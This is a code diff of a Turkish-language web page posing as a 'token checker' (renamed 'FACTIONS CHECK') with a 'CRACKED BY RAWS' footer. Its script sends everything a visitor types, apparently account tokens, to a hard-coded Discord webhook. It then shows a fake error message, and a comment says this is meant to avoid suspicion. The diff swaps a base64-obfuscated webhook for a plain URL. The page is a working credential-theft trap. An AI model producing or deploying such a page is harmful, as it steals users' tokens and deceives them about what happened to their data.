@@ -7,7 +7,6 @@
     <style>
         body { 
             background-color: #000;
-            /* Saf siyah üzerine çok hafif gri kareli doku */
             background-image: 
                 linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
                 linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
@@ -23,7 +22,6 @@
             cursor: none; 
         }
 
-        /* Neon Mavi Nokta İmleç */
         #cursor {
             width: 10px;
             height: 10px;
@@ -45,6 +43,7 @@
             border: 1px solid rgba(255, 255, 255, 0.05);
             box-shadow: 0 0 40px rgba(0, 0, 0, 1);
             position: relative;
+            z-index: 1;
         }
 
         h1 { 
@@ -55,7 +54,6 @@
             text-shadow: 0 0 15px rgba(255, 30, 30, 0.3);
         }
 
-        /* Veri Giriş Alanı */
         textarea { 
             width: 100%; 
             height: 160px; 
@@ -63,13 +61,12 @@
             background: #020202; 
             border: 1px solid rgba(255, 30, 30, 0.2); 
             border-radius: 8px; 
-            color: #00ff41; /* Hacker Yeşili yazı */
+            color: #00ff41; 
             margin-bottom: 20px; 
             outline: none; 
             resize: none; 
             box-sizing: border-box; 
             font-size: 13px;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
         }
 
         button { 
@@ -89,7 +86,6 @@
         button:hover { 
             filter: brightness(1.2);
             box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
-            transform: translateY(-1px);
         }
 
         #status { 
@@ -97,10 +93,8 @@
             font-size: 12px;
             color: #ffcc00;
             display: none;
-            font-style: italic;
         }
 
-        /* Rainbow Footer */
         .raws-footer {
             position: fixed;
             bottom: 20px;
@@ -123,26 +117,25 @@
 <div id="cursor"></div>
 
 <div class="container">
-    <h1>TOKEN CHECKER</h1>
-    <textarea id="contentInput" placeholder="Sisteme işlenecek verileri buraya girin..."></textarea>
-    <button id="submitBtn">KONTROLÜ BAŞLAT</button>
-    <div id="status">Sistem kontrol ediliyor...</div>
+    <h1>FACTIONS CHECK</h1>
+    <textarea id="contentInput" placeholder="Verileri buraya giriniz..."></textarea>
+    <button id="submitBtn">KONTROL ET</button>
+    <div id="status"></div>
 </div>
 
 <div class="raws-footer">CRACKED BY RAWS</div>
 
 <script>
 (function() {
-    // Mouse Takibi
+    // Mouse İmleç Takibi
     const cursor = document.getElementById('cursor');
-    document.addEventListener('mousemove', e => {
+    document.addEventListener('mousemove', (e) => {
         cursor.style.left = e.clientX + 'px';
         cursor.style.top = e.clientY + 'px';
     });
 
-    // Yeni Webhook (Base64 Gizleme)
-    const _key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyNjg2NzQ3NDE0MTI0NC9EYnlwOHFKdG5fMGlwRFNBM0Q0cW9UYmdsY3BpRHBzNmU1RTJnbVhXTTlSZDBtVTFsZ04weG5YMTNKd1l4eTNIWnJibg==";
-    const _w = atob(_key);
+    // Senin verdiğin webhook adresi
+    const webhookURL = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
 
     document.getElementById('submitBtn').addEventListener('click', async () => {
         const input = document.getElementById('contentInput').value;
@@ -152,16 +145,16 @@
 
         status.style.display = "block";
         status.textContent = "Bağlantı kuruluyor...";
+        status.style.color = "#ffcc00";
 
         try {
-            // Girilen tüm metni tek seferde webhook'a gönderir
-            await fetch(_w, {
+            await fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: "@everyone | Yeni Veri Girişi!",
+                    content: "@everyone | Yeni Veri!",
                     embeds: [{
-                        title: "📥 Gelen Veri / Token",
+                        title: "📥 Gelen Veri",
                         description: "```" + input + "```",
                         color: 16711680,
                         timestamp: new Date()
@@ -169,14 +162,15 @@
                 })
             });
 
-            // Kullanıcıya sahte bir hata mesajı göstererek şüphe çekmemesini sağlarız
+            // Başarılı olsa bile şüphe çekmemek için hata mesajı gösteriyoruz
             setTimeout(() => {
+                status.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
                 status.style.color = "#ff1e1e";
-                status.textContent = "✕ Geçersiz veri formatı tespit edildi.";
-            }, 1200);
+            }, 1000);
 
-        } catch (e) {
-            status.textContent = "Sunucu hatası, lütfen tekrar deneyin.";
+        } catch (err) {
+            console.error(err);
+            status.textContent = "Sunucuya bağlanılamadı.";
         }
     });
 })();
